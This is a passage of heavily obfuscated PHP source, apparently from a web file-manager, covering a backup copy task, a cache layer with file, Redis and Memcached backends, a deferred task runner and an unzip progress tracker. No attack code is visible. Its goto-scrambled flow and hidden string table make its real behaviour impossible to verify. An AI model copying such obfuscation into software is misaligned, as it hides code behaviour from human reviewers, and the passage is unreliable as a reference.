EÒÎ«è¢¹ã: $Aù¬¬Ï¿çà = Backup::get(); $BôÍ’Û¾›’ = $Aù¬¬Ï¿çà[$_SERVER[µ…][289]][$_SERVER[µ…][191]][$_SERVER[µ…][441]]; $FÎ›Ò…¯µØ = array($_SERVER[µ…][442] => array($_SERVER[µ…][753], $BôÍ’Û¾›’), $_SERVER[µ…][754] => array($_SERVER[µ…][327], $Aù¬¬Ï¿çà[$_SERVER[µ…][706]])); goto E¼œ——¬îõ; aõÅœ¯ã²å: $this->_fileFilter($d›œÂ—Êİ ); return !0; goto DŞéöÔÕ„Ù; B¾§µêí : $d×ãİ¡¡¹á = $F–§Î×òØ = 0; do { $C”Ğ»¿œ¾ = $_SERVER[µ…][759]; $fƒ¼ïô‹©ˆ = Model($_SERVER[µ…][733])->where($FÎ›Ò…¯µØ)->field($C”Ğ»¿œ¾)->order($_SERVER[µ…][760])->selectPage($fé¼¼ î“, $d¶ŒÆßÛŒ); $cöºÕìâ©Ê = !empty($fƒ¼ïô‹©ˆ[$_SERVER[µ…][365]]) ? $fƒ¼ïô‹©ˆ[$_SERVER[µ…][365]] : array(); foreach ($cöºÕìâ©Ê as $e•Ğ¤¨°ãÍ) { goto C¤ªÔå¥ùù; B’Ù¯õ”Ûœ: if ($FÇíˆ‚… ¼ >= 1024 * 1024 * 100) { $C‚”ãíÉ… = array($_SERVER[µ…][765] => $BôÍ’Û¾›’, $_SERVER[µ…][766] => $F–§Î×òØ, $_SERVER[µ…][767] => $d×ãİ¡¡¹á); Backup::set($C‚”ãíÉ…); $FÇíˆ‚… ¼ = $B©Š‘˜§¾ = 0; } goto DÕóºÙÚÄ; Añç¡ ´³: if (IO::exist($FÉ÷Ò Û„)) { $B¶¶ÄöÑ¹->updateFileEnd($e•Ğ¤¨°ãÍ[$_SERVER[µ…][28]], $e•Ğ¤¨°ãÍ[$_SERVER[µ…][77]]); } else { $FÉ÷Ò Û„ = get_path_father($FÉ÷Ò Û„); IO::mkdir($FÉ÷Ò Û„); if (!IO::copy($A‰³ê©²‡, $FÉ÷Ò Û„, $_SERVER[µ…][763])) { write_log($_SERVER[µ…][764] . $A‰³ê©²‡ . $_SERVER[µ…][749] . $FÉ÷Ò Û„ . $_SERVER[µ…][499], $_SERVER[µ…][728]); $Fóêó×Ù¼á = !1; break; } } $BôÍ’Û¾›’ = $e•Ğ¤¨°ãÍ[$_SERVER[µ…][441]]; $B©Š‘˜§¾ += 1; goto cæêÇà«À¤; C¤ªÔå¥ùù: if (!$this->_fileExist($e•Ğ¤¨°ãÍ, $d›œÂ—Êİ , $AŒÃ¹£ğ‰)) { $D±ß­‘¹ÀÇ -= 1; $D´²ëó‘İ† -= (int) $e•Ğ¤¨°ãÍ[$_SERVER[µ…][77]]; write_log("\x66\x69\x6c\x65\x20\x6e\x6f\164\x20\145\170\151\163\164\56\146\151\154\145\x49\104\72{$e•Ğ¤¨°ãÍ[$_SERVER[µ…][441]]}\x2c\40\x70\x61\164\150\x3a{$e•Ğ¤¨°ãÍ[$_SERVER[µ…][75]]}", $_SERVER[µ…][761]); continue; } $A‰³ê©²‡ = $e•Ğ¤¨°ãÍ[$_SERVER[µ…][75]]; $FÉ÷Ò Û„ = "\x7b\x69\x6f\x3a{$Aù¬¬Ï¿çà[$_SERVER[µ…][706]]}\x7d" . substr($A‰³ê©²‡, strlen("\173\x69\157\72{$e•Ğ¤¨°ãÍ[$_SERVER[µ…][762]]}\175")); goto Añç¡ ´³; cæêÇà«À¤: $FÇíˆ‚… ¼ += $e•Ğ¤¨°ãÍ[$_SERVER[µ…][77]]; $F–§Î×òØ += 1; $d×ãİ¡¡¹á += $e•Ğ¤¨°ãÍ[$_SERVER[µ…][77]]; goto B’Ù¯õ”Ûœ; DÕóºÙÚÄ: } $D˜àòîˆ— = count($cöºÕìâ©Ê); $d¶ŒÆßÛŒ++; } while ($D˜àòîˆ— == $fé¼¼ î“); $B¶¶ÄöÑ¹->end(); goto D­‡è¸ÔÉ; C‡¶Öõáñ: $B¶¶ÄöÑ¹->task[$_SERVER[µ…][713]] = $D´²ëó‘İ†; $C‚”ãíÉ… = array($_SERVER[µ…][757] => $D±ß­‘¹ÀÇ, $_SERVER[µ…][758] => $D´²ëó‘İ†); Backup::set($C‚”ãíÉ…); goto dŒì¢¿ŒÎù; dŒì¢¿ŒÎù: $Fóêó×Ù¼á = !0; $AŒÃ¹£ğ‰ = $this->storeIds(); $d¶ŒÆßÛŒ = 1; goto CïÉŒ†¶Êì; DŞéöÔÕ„Ù: } private function _fileExist($BË¹Üåº©î, &$bî¢¶’Ğ‹, $CÕ¼®¾áµ) { goto fÈˆËğ»è†; fÈˆËğ»è†: $fˆ‰ÎÁøİù =& $_SERVER[µ…]; $cªÉŒƒÍ°– = $BË¹Üåº©î[$fˆ‰ÎÁøİù[75]]; if (in_array($BË¹Üåº©î[$fˆ‰ÎÁøİù[441]], $bî¢¶’Ğ‹)) { return !1; } goto a„ˆóÔŞç©; a„ˆóÔŞç©: if (!in_array($BË¹Üåº©î[$fˆ‰ÎÁøİù[762]], $CÕ¼®¾áµ)) { return !1; } if (IO::exist($cªÉŒƒÍ°–)) { return !0; } $B©†æÂÚ·³ = get_path_father($cªÉŒƒÍ°–); goto B¨µ•Ç½­; cç»’›Æ £: $bî¢¶’Ğ‹ = array_merge($bî¢¶’Ğ‹, array_to_keyvalue($B¾äç²§ß, $fˆ‰ÎÁøİù[33], $fˆ‰ÎÁøİù[441])); return !1; goto b×§Ä®±¡²; B¨µ•Ç½­: if (IO::exist($B©†æÂÚ·³)) { $bî¢¶’Ğ‹[] = $BË¹Üåº©î[$fˆ‰ÎÁøİù[441]]; return !1; } $d“è¬ÑÀñ = array($fˆ‰ÎÁøİù[762] => $BË¹Üåº©î[$fˆ‰ÎÁøİù[762]], $fˆ‰ÎÁøİù[75] => array($fˆ‰ÎÁøİù[378], "{$B©†æÂÚ·³}\45")); $B¾äç²§ß = Model($fˆ‰ÎÁøİù[733])->where($d“è¬ÑÀñ)->field($fˆ‰ÎÁøİù[442])->select(); goto cç»’›Æ £; b×§Ä®±¡²: } private function _fileFilter($cÉšè—å£ğ) { $D¿†°–°« =& $_SERVER[µ…]; if (empty($cÉšè—å£ğ)) { return; } $cŒè½ßŠÚ = array($D¿†°–°«[441] => array($D¿†°–°«[7], array_unique($cÉšè—å£ğ))); $FÁÌàÍô‘Â = Model($D¿†°–°«[769])->where($cŒè½ßŠÚ)->field($D¿†°–°«[390])->select(); foreach ($FÁÌàÍô‘Â as $a—à”Ê×·¼) { Model($D¿†°–°«[769])->remove($a—à”Ê×·¼[$D¿†°–°«[390]], !1); } } private function storeIds() { $b‰²ï¨•ÙÏ =& $_SERVER[µ…]; $FÇ”‹­…šø = Model($b‰²ï¨•ÙÏ[718])->listData(); $f¼Ş–Ÿ­ò = array(); $B–¶šõ•·– = $GLOBALS[$b‰²ï¨•ÙÏ[6]][$b‰²ï¨•ÙÏ[87]][$b‰²ï¨•ÙÏ[770]]; foreach ($FÇ”‹­…šø as $C»›Åê¹Ê³) { $fÌ¯š×ğ¼› = strtolower($C»›Åê¹Ê³[$b‰²ï¨•ÙÏ[93]]); if (!isset($B–¶šõ•·–[$fÌ¯š×ğ¼›])) { continue; } $bá¾ğàÒ‹‘ = $b‰²ï¨•ÙÏ[71] . (isset($B–¶šõ•·–[$fÌ¯š×ğ¼›]) ? $B–¶šõ•·–[$fÌ¯š×ğ¼›] : ucfirst($fÌ¯š×ğ¼›)); if (!class_exists($bá¾ğàÒ‹‘)) { continue; } $f¼Ş–Ÿ­ò[] = $C»›Åê¹Ê³[$b‰²ï¨•ÙÏ[388]]; } return $f¼Ş–Ÿ­ò; } } class Cache { protected static $handle; protected static $memoryCache; public static function init() { goto bË¦Ğ‘§ÁŸ; bË¦Ğ‘§ÁŸ: $dÙôÌô›¿Ç =& $_SERVER[µ…]; if (self::$handle) { return self::$handle; } self::$memoryCache = array(); goto A÷Üµ¸ë›™; Eùë˜†˜Ó: switch ($Fªè–¦Ğ‰œ[$dÙôÌô›¿Ç[771]]) { case $dÙôÌô›¿Ç[17]: self::$handle = Model($dÙôÌô›¿Ç[773]); break; case $dÙôÌô›¿Ç[774]: self::$handle = new CacheRedis($b÷‘¯½‹§†, $d”†§Ãî¿); break; case $dÙôÌô›¿Ç[775]: self::$handle = new CacheMemcached($b÷‘¯½‹§†, $d”†§Ãî¿); break; case $dÙôÌô›¿Ç[191]: self::$handle = new CacheFile($b÷‘¯½‹§†, $d”†§Ãî¿); break; default: break; } return self::$handle; goto D¥¿›Œ†Ğ†; A÷Üµ¸ë›™: $Fªè–¦Ğ‰œ = $GLOBALS[$dÙôÌô›¿Ç[6]][$dÙôÌô›¿Ç[345]]; $b÷‘¯½‹§† = $Fªè–¦Ğ‰œ[$Fªè–¦Ğ‰œ[$dÙôÌô›¿Ç[771]]]; $d”†§Ãî¿ = $Fªè–¦Ğ‰œ[$dÙôÌô›¿Ç[772]]; goto Eùë˜†˜Ó; D¥¿›Œ†Ğ†: } public static function initReset() { self::$handle = !1; self::$memoryCache = !1; } public static function key($f±ö«ÏÆĞˆ) { if (is_array($f±ö«ÏÆĞˆ) || is_object($f±ö«ÏÆĞˆ)) { $f±ö«ÏÆĞˆ = json_encode($f±ö«ÏÆĞˆ); } $f±ö«ÏÆĞˆ = rawurlencode($f±ö«ÏÆĞˆ); return md5(KOD_SITE_ID . $_SERVER[µ…][70] . $f±ö«ÏÆĞˆ); } public static function get($C¼â¾Ãí», $FÍ½äâñÚğ = false) { $C¢‘…¼À¢ = self::key($C¼â¾Ãí»); if ($FÍ½äâñÚğ) { return unserialize(self::init()->get($C¢‘…¼À¢)); } if (!isset(self::$memoryCache[$C¢‘…¼À¢])) { $eˆ® šÇ¯µ = self::init()->get($C¢‘…¼À¢); self::$memoryCache[$C¢‘…¼À¢] = unserialize($eˆ® šÇ¯µ); } return self::$memoryCache[$C¢‘…¼À¢]; } public static function set($aìŸó¿êĞ, $B—Á´¥‚èå, $EÚ„·°…± = false) { goto c†Ô½íŞÌÌ; E³“öñ»: CacheLock::unlock($aìŸó¿êĞ); return $B’Æõ­âç; goto aŠ‘‘ò…»; c†Ô½íŞÌÌ: $b°İØŠ¦— = self::key($aìŸó¿êĞ); if (isset(self::$memoryCache[$b°İØŠ¦—]) && self::$memoryCache[$b°İØŠ¦—] === $B—Á´¥‚èå) { return !0; } if ($EÚ„·°…± === 0) { self::$memoryCache[$b°İØŠ¦—] = $B—Á´¥‚èå; return !0; } goto dÚ‘Û®¸Ë¸; dÚ‘Û®¸Ë¸: CacheLock::lock($aìŸó¿êĞ); $B’Æõ­âç = self::init()->set($b°İØŠ¦—, serialize($B—Á´¥‚èå), $EÚ„·°…±); self::$memoryCache[$b°İØŠ¦—] = $B—Á´¥‚èå; goto E³“öñ»; aŠ‘‘ò…»: } public static function getCall($aİ„•§‰¾é, $A‘šÏãÀè, $C¢ˆÌ‹¯, $Dİ¡¦—§İ± = array()) { $C½ŠŸÛ¾ç‘ = self::get($aİ„•§‰¾é); if ($C½ŠŸÛ¾ç‘) { return $C½ŠŸÛ¾ç‘; } $C½ŠŸÛ¾ç‘ = call_user_func_array($C¢ˆÌ‹¯, $Dİ¡¦—§İ±); self::set($aİ„•§‰¾é, $C½ŠŸÛ¾ç‘, $A‘šÏãÀè); return $C½ŠŸÛ¾ç‘; } public static function remove($aù£‘‰„‚) { goto aãğÚÌÖ´Š; aãğÚÌÖ´Š: $e½ªïŞŸğ = self::key($aù£‘‰„‚); unset(self::$memoryCache[$e½ªïŞŸğ]); self::clearTimeout(); goto Få¿†ËéµÖ; Få¿†ËéµÖ: CacheLock::lock($aù£‘‰„‚); $F¨Ş‹¢™µÚ = self::init()->remove($e½ªïŞŸğ); CacheLock::unlock($aù£‘‰„‚); goto e³ÁŸ¨Š”±; e³ÁŸ¨Š”±: return $F¨Ş‹¢™µÚ; goto F¬–«ñŸå; F¬–«ñŸå: } public static function removeMemory($e›Ó»Ãìª†) { $B•ˆãÙ³İ = self::key($e›Ó»Ãìª†); unset(self::$memoryCache[$B•ˆãÙ³İ]); } public static function clearMemory($a¢¬ŒÖñ¥Š = false) { if ($a¢¬ŒÖñ¥Š) { $a¢¬ŒÖñ¥Š = self::key($a¢¬ŒÖñ¥Š); unset(self::$memoryCache[$a¢¬ŒÖñ¥Š]); return; } self::$memoryCache = null; self::$memoryCache = array(); } public static function deleteAll() { self::$memoryCache = array(); if (method_exists(self::init(), $_SERVER[µ…][776])) { self::init()->deleteAll(); } } public static function clearTimeout() { if (method_exists(self::init(), $_SERVER[µ…][777])) { self::init()->clearTimeout(); } } } class CacheFile { public $cachePath; public $prefix; public $cacheTime; public function __construct($FŞåÙ…ÓÄ, $eâõÊØÓå) { $c£¬Ğ¤”¬ =& $_SERVER[µ…]; $this->cachePath = $FŞåÙ…ÓÄ[$c£¬Ğ¤”¬[75]]; $this->prefix = $c£¬Ğ¤”¬[778]; $this->cacheTime = $eâõÊØÓå; if (!file_exists($this->cachePath)) { mkdir($this->cachePath, 511, !0); } } public function getFile($c­¹äÜ†) { $B£êæ§¸Ö =& $_SERVER[µ…]; $c­¹äÜ† = str_replace(array($B£êæ§¸Ö[779], $B£êæ§¸Ö[96], $B£êæ§¸Ö[69]), $B£êæ§¸Ö[780], $c­¹äÜ†); return $this->cachePath . $B£êæ§¸Ö[781] . $c­¹äÜ† . $B£êæ§¸Ö[782]; } public function set($b³å¾õ±’, $C…£›»–˜ç, $eÚ¼èöÇ†º = false) { $A› ®³ÁïÖ = $this->getFile($b³å¾õ±’); if (file_put_contents($A› ®³ÁïÖ, $this->prefix . $C…£›»–˜ç, LOCK_EX)) { return !0; } @unlink($A› ®³ÁïÖ); return !1; } public function get($b¾š³‘ˆÊğ) { $E‰††¦À¤ = $this->getFile($b¾š³‘ˆÊğ); if (file_exists($E‰††¦À¤) && filemtime($E‰††¦À¤) < time() - $this->cacheTime) { @unlink($E‰††¦À¤); return !1; } $E´¶‚›¢‰² = @file_get_contents($E‰††¦À¤); return substr($E´¶‚›¢‰², strlen($this->prefix)); } public function remove($eóÛß²¸…˜) { $eÇÒšã¬Æ‘ = $this->getFile($eóÛß²¸…˜); return @unlink($eÇÒšã¬Æ‘); } public function deleteAll() { $f¥À½º»ÔÖ =& $_SERVER[µ…]; $dëæ©ÏêŒ = scandir($this->cachePath); foreach ($dëæ©ÏêŒ as $d§¯«±„Â) { $AóÉ´–ˆ = $this->cachePath . $d§¯«±„Â; if (strpos($AóÉ´–ˆ, $f¥À½º»ÔÖ[782]) && strpos($AóÉ´–ˆ, $f¥À½º»ÔÖ[783])) { @unlink($AóÉ´–ˆ); } } } public function clearTimeout() { $eõÓÊºæ¨ =& $_SERVER[µ…]; $BÃƒµŞË« = scandir($this->cachePath); foreach ($BÃƒµŞË« as $a£÷Øù¶è) { $bèö©á‚¯ = $this->cachePath . $a£÷Øù¶è; if (strpos($bèö©á‚¯, $eõÓÊºæ¨[782]) && strpos($bèö©á‚¯, $eõÓÊºæ¨[783]) && filemtime($bèö©á‚¯) < time() - $this->cacheTime) { @unlink($bèö©á‚¯); } } } } goto A¯¥ÄÛÎ½Ø; eòâÂ…•œÈ: class TaskRun { private static $asyncAdd = false; private static $syncTask = false; public static function timeLimit($AØÄĞéôÏ£, $eœŸµò„¹é = 5.0) { if (!$AØÄĞéôÏ£) { return; } $f´§†“Ã¬÷ = Cache::get($AØÄĞéôÏ£); if (!$f´§†“Ã¬÷ || timeFloat() - floatVal($f´§†“Ã¬÷) >= $eœŸµò„¹é) { Cache::set($AØÄĞéôÏ£, timeFloat(), $eœŸµò„¹é * 10); return !0; } return !1; } public static function timeLimitCall($EÇ˜ÕÀĞáä, $D¸×ÙÍº¹ã, $cİ‹‡ùï‰², $aÇŞŞ£ˆ²“ = 5.0) { goto b‰êíó†‰‡; Fâ®ŞÙ„: if (is_array($dİÕÑä¼Í[$EÇ˜ÕÀĞáä])) { $cï½¶–á†‘[$D™ºåÄíäÓ[1582]] = $dİÕÑä¼Í[$EÇ˜ÕÀĞáä][$D™ºåÄíäÓ[1582]]; } if (is_array($dİÕÑä¼Í[$EÇ˜ÕÀĞáä])) { if (timeFloat() - $dİÕÑä¼Í[$EÇ˜ÕÀĞáä][$D™ºåÄíäÓ[1581]] < $cï½¶–á†‘[$D™ºåÄíäÓ[195]] * 0.3) { return; } $cï½¶–á†‘[$D™ºåÄíäÓ[1582]] = $dİÕÑä¼Í[$EÇ˜ÕÀĞáä][$D™ºåÄíäÓ[1582]]; } $dİÕÑä¼Í[$EÇ˜ÕÀĞáä] = $cï½¶–á†‘; goto FÍ¥Ã³¿’; FÍ¥Ã³¿’: Cache::set($Cá„åÀÑ, $dİÕÑä¼Í, 60); Cache::removeMemory($Cá„åÀÑ); write_log($D™ºåÄíäÓ[1583] . $EÇ˜ÕÀĞáä . $D™ºåÄíäÓ[67] . $D¸×ÙÍº¹ã, $D™ºåÄíäÓ[1577]); goto aÃ¥È¦¡¾; cÓË®Ëñâº: $Cá„åÀÑ = $D™ºåÄíäÓ[1580]; $dİÕÑä¼Í = Cache::get($Cá„åÀÑ, !0); $cï½¶–á†‘ = array($D™ºåÄíäÓ[1581] => timeFloat(), $D™ºåÄíäÓ[1582] => timeFloat(), $D™ºåÄíäÓ[260] => $D¸×ÙÍº¹ã, $D™ºåÄíäÓ[1575] => $cİ‹‡ùï‰², $D™ºåÄíäÓ[195] => $aÇŞŞ£ˆ²“); goto Fâ®ŞÙ„; b‰êíó†‰‡: $D™ºåÄíäÓ =& $_SERVER[µ…]; if (!$EÇ˜ÕÀĞáä || !$D¸×ÙÍº¹ã) { return; } self::$asyncAdd = !0; goto cÓË®Ëñâº; aÃ¥È¦¡¾: } public static function timeLimitCallLoop() { goto C­éÓ“Â¹˜; DÄï„…Ü‹ˆ: if (!$bÑùÜË¼ƒ) { return Cache::remove($e¥À‡ô•ñÌ); } Cache::set($e¥À‡ô•ñÌ, $bÑùÜË¼ƒ, 60); Cache::removeMemory($e¥À‡ô•ñÌ); goto c§·Š¶˜—‡; C­éÓ“Â¹˜: $CË³ÁÇ =& $_SERVER[µ…]; $fŒ’²ã¦ñ« = array($CË³ÁÇ[1584]); $Fï‡Àáå£¢ = in_array(strtolower(ACTION), $fŒ’²ã¦ñ«); goto EÂŠˆº¢”; EÂŠˆº¢”: if (!$Fï‡Àáå£¢ && !self::$asyncAdd) { return; } $e¥À‡ô•ñÌ = $CË³ÁÇ[1580]; $fÃ–ÅÛì½¤ = Cache::get($e¥À‡ô•ñÌ, !0); goto F¿ÜßÏ©é¾; F¿ÜßÏ©é¾: if (!$fÃ–ÅÛì½¤ || count($fÃ–ÅÛì½¤) <= 0) { return; } $BÅàÜÎ°õ = !1; $e‡±Œøâ = timeFloat(); goto e÷º¾ÏÔ£¯; e÷º¾ÏÔ£¯: $bÑùÜË¼ƒ = array(); foreach ($fÃ–ÅÛì½¤ as $E—Şİàà‡ => $b±­Š¥…¯õ) { if ($e‡±Œøâ - $b±­Š¥…¯õ[$CË³ÁÇ[1582]] > $b±­Š¥…¯õ[$CË³ÁÇ[195]]) { $BÅàÜÎ°õ = !0; try { Hook::apply($b±­Š¥…¯õ[$CË³ÁÇ[260]], $b±­Š¥…¯õ[$CË³ÁÇ[1575]]); write_log($CË³ÁÇ[1585] . $E—Şİàà‡ . $CË³ÁÇ[67] . $b±­Š¥…¯õ[$CË³ÁÇ[260]] . $CË³ÁÇ[1586] . ACTION, $CË³ÁÇ[1577]); } catch (Exception $Fˆ…â¹·ù) { } continue; } $bÑùÜË¼ƒ[$E—Şİàà‡] = $b±­Š¥…¯õ; } if (!$BÅàÜÎ°õ) { return; } goto DÄï„…Ü‹ˆ; c§·Š¶˜—‡: } public static function finished($EŞ¸‹¥©Åë, $AÛç‹÷¢¢„) { $c•¬Ö¦½è¾ =& $_SERVER[µ…]; if (!self::$syncTask) { self::$syncTask = array(); } self::$syncTask[] = array($c•¬Ö¦½è¾[260] => $EŞ¸‹¥©Åë, $c•¬Ö¦½è¾[1575] => $AÛç‹÷¢¢„); } private static function finishedRun() { $e«çš‡Óè =& $_SERVER[µ…]; if (!self::$syncTask) { return; } foreach (self::$syncTask as $F¸˜¼òã‰¼) { try { Hook::apply($F¸˜¼òã‰¼[$e«çš‡Óè[260]], $F¸˜¼òã‰¼[$e«çš‡Óè[1575]]); } catch (Exception $b¬â’ÇÊ •) { } } } public static function autoRun() { self::finishedRun(); self::timeLimitCallLoop(); } } class TaskUnzip extends TaskFileTransfer { protected function startAfter() { goto FÈùÒãÖ”©; DÄ××Ê: if (!$e…ìøÖÛĞ•[$c¢ÈµÓå¤í[1411]]) { $e…ìøÖÛĞ•[$c¢ÈµÓå¤í[1411]] = LNG($c¢ÈµÓå¤í[1591]); } goto D±„ô¯Â÷‡; FÈùÒãÖ”©: $c¢ÈµÓå¤í =& $_SERVER[µ…]; parent::startAfter(); Hook::bind($c¢ÈµÓå¤í[1587], array($this, $c¢ÈµÓå¤í[1588])); goto cÃµƒ å¨; cÃµƒ å¨: Hook::bind($c¢ÈµÓå¤í[1066], array($this, $c¢ÈµÓå¤í[1589])); $e…ìøÖÛĞ• =& $this->task; $e…ìøÖÛĞ•[$c¢ÈµÓå¤í[1590]] = $c¢ÈµÓå¤í[1071]; goto DÄ××Ê; D±„ô¯Â÷‡: } protected function endAfter() { $D‡Œ‘˜•ÃÁ =& $_SERVER[µ…]; parent::endAfter(); Hook::unbind($D‡Œ‘˜•ÃÁ[1587], array($this, $D‡Œ‘˜•ÃÁ[1588])); Hook::unbind($D‡Œ‘˜•ÃÁ[1066], array($this, $D‡Œ‘˜•ÃÁ[1589])); } public function updateAfter() { $dŠéÔÚÈÚÙ =& $_SERVER[µ…]; $A‘¹ î–¬ =& $this->task; if (!$A‘¹ î–¬[$dŠéÔÚÈÚÙ[999]] || !$A‘¹ î–¬[$dŠéÔÚÈÚÙ[713]]) { return; } if ($A‘¹ î–¬[$dŠéÔÚÈÚÙ[1590]] == $dŠéÔÚÈÚÙ[1071]) { $e „ô¦Ë¦Ñ = 0; if ($A‘¹ î–¬[$dŠéÔÚÈÚÙ[1549]]) { $e „ô¦Ë¦Ñ = $A‘¹ î–¬[$dŠéÔÚÈÚÙ[1550]] / $A‘¹ î–¬[$dŠéÔÚÈÚÙ[1549]]; } $A‘¹ î–¬[$dŠéÔÚÈÚÙ[1507]] = $e „ô¦Ë¦Ñ * 0.3; } else { if ($A‘¹ î–¬[$dŠéÔÚÈÚÙ[1590]] == $dŠéÔÚÈÚÙ[309]) { $e „ô¦Ë¦Ñ = $A‘¹ î–¬[$dŠéÔÚÈÚÙ[1013]] / $A‘¹ î–¬[$dŠéÔÚÈÚÙ[999]]; $A‘¹ î–¬[$dŠéÔÚÈÚÙ[1507]] = 0.3 + $e „ô¦Ë¦Ñ * 0.4; } else { if ($A‘¹ î–¬[$dŠéÔÚÈÚÙ[1590]] == $dŠéÔÚÈÚÙ[106]) { $eÙ‹Ë˜Ÿ¬Ÿ = 0; if ($A‘¹ î–¬[$dŠéÔÚÈÚÙ[1551]] == $dŠéÔÚÈÚÙ[106]) { $eÙ‹Ë˜Ÿ¬Ÿ = $A‘¹ î–¬[$dŠéÔÚÈÚÙ[1550]]; } $e „ô¦Ë¦Ñ = ($A‘¹ î–¬[$dŠéÔÚÈÚÙ[1554]] + $eÙ‹Ë˜Ÿ¬Ÿ) / $A‘¹ î–¬[$dŠéÔÚÈÚÙ[713]]; $A‘¹ î–¬[$dŠéÔÚÈÚÙ[1507]] = 0.3 + 0.4 + $e „ô¦Ë¦Ñ * 0.3; } } } if ($A‘¹ î–¬[$dŠéÔÚÈÚÙ[1507]] > 0) { $b†§Úê»ˆ° = timeFloat() - $A‘¹ î–¬[$dŠéÔÚÈÚÙ[735]] - $A‘¹ î–¬[$dŠéÔÚÈÚÙ[1510]]; $A‘¹ î–¬[$dŠéÔÚÈÚÙ[1511]] = $b†§Úê»ˆ° * (1 - $A‘¹ î–¬[$dŠéÔÚÈÚÙ[1507]]) / $A‘¹ î–¬[$dŠéÔÚÈÚÙ[1507]]; } } public function addFile($BæåëĞèŞŸ) { goto bŞƒ¼¡¢ò; bŞƒ¼¡¢ò: $aÍ°›æõ¯ç =& $_SERVER[µ…]; $Dà·Üéœõ =& $this->task; $c½¬â»¬÷ = IO::info($BæåëĞèŞŸ); goto DŒõêÛŸ; C§Ä†ÖÕÄ: $Dà·Üéœõ[$aÍ°›æõ¯ç[1001]] = $aÍ°›æõ¯ç[1566]; $Dà·Üéœõ[$aÍ°›æõ¯ç[1551]] = $aÍ°›æõ¯ç[1071]; $Dà·Üéœõ[$aÍ°›æõ¯ç[713]] = $c½¬â»¬÷[$aÍ°›æõ¯ç[77]]; goto CÙƒòÌĞå; c†›È°íŠ: $this->update(); goto Fë„‡¢¯ï£; CÙƒòÌĞå: $Dà·Üéœõ[$aÍ°›æõ¯ç[999]] = 1; $eíÄôé¸²Ú = 0; $Dà·Üéœõ[$aÍ°›æõ¯ç[1558]] = array($aÍ°›æõ¯ç[1559] => $eíÄôé¸²Ú + 1, $aÍ°›æõ¯ç[407] => $c½¬â»¬÷[$aÍ°›æõ¯ç[28]], $aÍ°›æõ¯ç[75] => $c½¬â»¬÷[$aÍ°›æõ¯ç[75]], $aÍ°›æõ¯ç[489] => $c½¬â»¬÷[$aÍ°›æõ¯ç[489]] ? $c½¬â»¬÷[$aÍ°›æõ¯ç[489]] : $c½¬â»¬÷[$aÍ°›æõ¯ç[75]]); goto c†›È°íŠ; DŒõêÛŸ: $Dà·Üéœõ[$aÍ°›æõ¯ç[1547]] = $c½¬â»¬÷[$aÍ°›æõ¯ç[28]]; $Dà·Üéœõ[$aÍ°›æõ¯ç[1549]] = $c½¬â»¬÷[$aÍ°›æõ¯ç[77]]; $Dà·Üéœõ[$aÍ°›æõ¯ç[1550]] = 0; goto C§Ä†ÖÕÄ; Fë„‡¢¯ï£: } public function unzipAfter($D‹š¸æˆñ) { goto d‚Ğ¬Ù…Ö‘; fğ²¹ƒÄİ: $DæÕ°Œâ‰® = IO::infoWithChildren($D‹š¸æˆñ); $bÈ¼ ëæÉò = 0; $d¯ºÛ¥Ò¦[$f§•¯ÀÆ¥ˆ[1558]] = array($f§•¯ÀÆ¥ˆ[1559] => $bÈ¼ ëæÉò + 1, $f§•¯ÀÆ¥ˆ[407] => $DæÕ°Œâ‰®[$f§•¯ÀÆ¥ˆ[28]], $f§•¯ÀÆ¥ˆ[75] => $DæÕ°Œâ‰®[$f§•¯ÀÆ¥ˆ[75]], $f§•¯ÀÆ¥ˆ[489] => $DæÕ°Œâ‰®[$f§•¯ÀÆ¥ˆ[489]] ? $DæÕ°Œâ‰®[$f§•¯ÀÆ¥ˆ[489]] : $DæÕ°Œâ‰®[$f§•¯ÀÆ¥ˆ[75]]); goto Cº¹ÄĞòŠ; AÁ¥”é¥‹õ: $this->update(); self::log($f§•¯ÀÆ¥ˆ[1592] . json_encode(array($d¯ºÛ¥Ò¦, $DæÕ°Œâ‰®))); goto Dñ×…á¥Ä; dß´ÇÂ¹“: $d¯ºÛ¥Ò¦[$f§•¯ÀÆ¥ˆ[1013]] = 0; $d¯ºÛ¥Ò¦[$f§•¯ÀÆ¥ˆ[1549]] = 0; $d¯ºÛ¥Ò¦[$f§•¯ÀÆ¥ˆ[1550]] = 0; goto FÄâ†½´è; FÄâ†½´è: $d¯ºÛ¥Ò¦[$f§•¯ÀÆ¥ˆ[1547]] = $f§•¯ÀÆ¥ˆ[33]; $d¯ºÛ¥Ò¦[$f§•¯ÀÆ¥ˆ[1554]] = 0; $d¯ºÛ¥Ò¦[$f§•¯ÀÆ¥ˆ[713]] = $DæÕ°Œâ‰®[$f§•¯ÀÆ¥ˆ[77]]; goto AÁ¥”é¥‹õ; d‚Ğ¬Ù…Ö‘: $f§•¯ÀÆ¥ˆ =& $_SERVER[µ…]; $d¯ºÛ¥Ò¦ =& $this->task; $d¯ºÛ¥Ò¦[$f§•¯ÀÆ¥ˆ[1590]] = $f§•¯ÀÆ¥ˆ[106]; goto fğ²¹ƒÄİ; Cº¹ÄĞòŠ: if ($DæÕ°Œâ‰®[$f§•¯ÀÆ¥ˆ[29]] == $f§•¯ÀÆ¥ˆ[191]) { $d¯ºÛ¥Ò¦[$f§•¯ÀÆ¥ˆ[999]] = 1; } else { $d¯ºÛ¥Ò¦[$f§•¯ÀÆ¥ˆ[999]] = $DæÕ°Œâ‰®[$f§•¯ÀÆ¥ˆ[80]][$f§•¯ÀÆ¥ˆ[78]]; } $d¯ºÛ¥Ò¦[$f§•¯ÀÆ¥ˆ[1001]] = $f§•¯ÀÆ¥ˆ[33]; $d¯ºÛ¥Ò¦[$f§•¯ÀÆ¥ˆ[1551]] = 0; goto dß´ÇÂ¹“; Dñ×…á¥Ä: } public function nameParse($eÒŠ½„’¥ô) { goto e¯´Ù§è‰µ; aËêÈšïç•: $this->update(); goto B¹¸‚…Ó°; e¯´Ù§è‰µ: $cë¡‘ßÔ¬‚ =& $_SERVER[µ…]; $CôÊÍññçó =& $this->task; if ($CôÊÍññçó[$cë¡‘ßÔ¬‚[1590]] == $cë¡‘ßÔ¬‚[1071]) { $CôÊÍññçó[$cë¡‘ßÔ¬‚[1590]] = $cë¡‘ßÔ¬‚[309]; $CôÊÍññçó[$cë¡‘ßÔ¬‚[1554]] = 0; $CôÊÍññçó[$cë¡‘ßÔ¬‚[713]] = 0; } goto DÕÓ›ë¯ ”; DÕÓ›ë¯ ”: $cçšÉ¤º÷  = get_path_this($eÒŠ½„’¥ô); if (strstr($cçšÉ¤º÷ , $cë¡‘ßÔ¬‚[94])) { 